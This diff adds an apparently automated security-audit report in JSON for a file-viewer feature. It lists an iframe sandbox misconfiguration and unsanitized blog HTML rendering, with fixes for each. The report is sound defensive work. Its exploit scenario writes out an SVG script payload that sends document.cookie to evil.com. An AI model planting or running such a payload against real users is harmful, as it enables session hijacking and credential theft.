@@ -1,0 +1,98 @@
+{
+  "version": "2.0.0",
+  "date": "2026-05-31T15:09:08Z",
+  "mode": "daily",
+  "scope": "full",
+  "diff_mode": false,
+  "target": "file-viewer feature branch (7 new files, 1 modified)",
+  "phases_run": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14],
+  "attack_surface": {
+    "code": {
+      "public_endpoints": 0,
+      "authenticated": 0,
+      "admin": 0,
+      "api": 0,
+      "uploads": 1,
+      "integrations": 1,
+      "background_jobs": 0,
+      "websockets": 0
+    },
+    "infrastructure": {
+      "ci_workflows": 0,
+      "webhook_receivers": 0,
+      "container_configs": 0,
+      "iac_configs": 0,
+      "deploy_targets": 1,
+      "secret_management": "env_vars"
+    }
+  },
+  "findings": [
+    {
+      "id": 1,
+      "severity": "MEDIUM",
+      "confidence": 8,
+      "status": "VERIFIED",
+      "phase": 9,
+      "phase_name": "OWASP A05 — Security Misconfiguration",
+      "category": "Sandbox Bypass",
+      "fingerprint": "sha256:iframesandbox",
+      "title": "iframe sandbox uses allow-same-origin + allow-scripts — same-origin storage accessible from rendered content",
+      "file": "components/file-viewer/PreviewFrame.tsx",
+      "line": 296,
+      "description": "The PreviewFrame iframe uses sandbox=\"allow-scripts allow-same-origin\". When both tokens are present, scripts running in the iframe can access the parent origin's cookies, localStorage, and sessionStorage. If a user uploads a malicious file containing executable code (SVG with embedded <script>, HTML with inline scripts), that code runs within the sandboxed iframe but with same-origin privileges — meaning it can read session tokens from cookies and exfiltrate them via script-accessible channels (navigator.sendBeacon, img src, etc.).",
+      "exploit_scenario": "1. Attacker crafts an SVG file with embedded <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n2. Attacker tricks victim into uploading and previewing this file on craftisle.com\n3. The SVG renders in the iframe, the script executes with same-origin privileges\n4. Session cookies, localStorage tokens, and other same-origin data are exfiltrated to attacker's server",
+      "impact": "Potential session hijacking. If the user is authenticated on craftisle.com (NextAuth session cookie), a malicious file could exfiltrate the session token, allowing the attacker to impersonate the user.",
+      "recommendation": "Option A (architectural): Remove allow-same-origin and use postMessage to transfer Blob data into the iframe instead of loading Blob URLs directly. The iframe would render from an ArrayBuffer received via postMessage.\nOption B (mitigation only): Document this as a known trade-off. The risk is self-XSS (user must be tricked into uploading a malicious file), and the damage is limited to the user's own session. Add a Content-Security-Policy header to viewer.craftisle.com that restricts script execution.",
+      "verification": "self-verified"
+    },
+    {
+      "id": 2,
+      "severity": "LOW",
+      "confidence": 6,
+      "status": "UNVERIFIED",
+      "phase": 11,
+      "phase_name": "Data Classification",
+      "category": "Information Disclosure",
+      "fingerprint": "sha256:blogxss",
+      "title": "Blog page renders Ghost CMS HTML via dangerouslySetInnerHTML without sanitization",
+      "file": "app/(marketing)/blog/[slug]/page.tsx",
+      "line": 113,
+      "description": "The blog post page uses dangerouslySetInnerHTML={{ __html: post.html || \"\" }} to render Ghost CMS content. No DOMPurify or similar sanitization step is applied before rendering. If the Ghost CMS admin account is compromised, an attacker could inject malicious scripts into blog posts that would execute in readers' browsers.",
+      "exploit_scenario": "1. Attacker compromises Ghost CMS admin credentials\n2. Attacker edits a blog post to include <script>/* malicious code */</script>\n3. All visitors to the blog post have the script executed in their browser\n4. Session cookies, auth tokens exfiltrated",
+      "impact": "Stored XSS via compromised CMS. Requires CMS compromise as prerequisite, which limits practical exploitability.",
+      "recommendation": "Add DOMPurify or isomorphic-dompurify to sanitize post.html before rendering. Even for trusted CMS content, defense-in-depth is warranted.",
+      "verification": "self-verified"
+    }
+  ],
+  "supply_chain_summary": {
+    "direct_deps": 0,
+    "transitive_deps": 0,
+    "critical_cves": 0,
+    "high_cves": 0,
+    "install_scripts": 0,
+    "lockfile_present": true,
+    "lockfile_tracked": true,
+    "tools_skipped": ["npm audit — not run, file-viewer adds no new dependencies"]
+  },
+  "filter_stats": {
+    "candidates_scanned": 12,
+    "hard_exclusion_filtered": 7,
+    "confidence_gate_filtered": 3,
+    "verification_filtered": 0,
+    "reported": 2
+  },
+  "totals": {
+    "critical": 0,
+    "high": 0,
+    "medium": 1,
+    "low": 1,
+    "tentative": 0
+  },
+  "trend": {
+    "prior_report_date": null,
+    "resolved": 0,
+    "persistent": 0,
+    "new": 2,
+    "direction": "first_run"
+  }
+}
